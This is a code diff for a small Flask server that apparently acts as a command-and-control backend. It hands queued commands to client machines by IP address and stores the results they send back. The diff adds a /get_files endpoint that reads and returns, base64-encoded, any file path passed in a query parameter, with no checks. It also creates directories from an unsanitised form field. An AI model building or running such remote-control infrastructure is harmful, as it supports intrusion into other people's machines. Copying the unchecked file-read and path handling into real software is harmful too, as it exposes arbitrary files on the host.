@@ -3,12 +3,10 @@ from datetime import datetime
 from base64 import b64decode,b64encode
 import db, json, os
 
-
 app = Flask(__name__)
-app.config['MAX_CONTENT_LENGTH'] = 1024*1024
+app.config['MAX_FORM_MEMORY_SIZE'] = 1024*1024*10
 
 def res_post():
-    print(request)
     try:
         os.mkdir(f'./results/{request.form['ip']}')
     except:
@@ -61,7 +59,6 @@ def throw_command():
 
 @app.route('/get_tactic/<string:ip_addr>', methods=['GET'])
 def get_tactic(ip_addr):
-    print(ip_addr)
     command = db.select(ip_addr,'command')
     if command == None:
         return abort(404)
@@ -81,6 +78,12 @@ def get_results():
     except:
         return ''
 
-@app.route('/get_files', methods=['GET', 'POST'])
+@app.route('/get_files', methods=['GET'])
 def get_files():
-    pass
+    if request.method=='GET':
+        try:
+            with open(request.args.get('file'),'rb') as fl:
+                data = b64encode(fl.read())
+            return data, 200
+        except:
+            return '',500
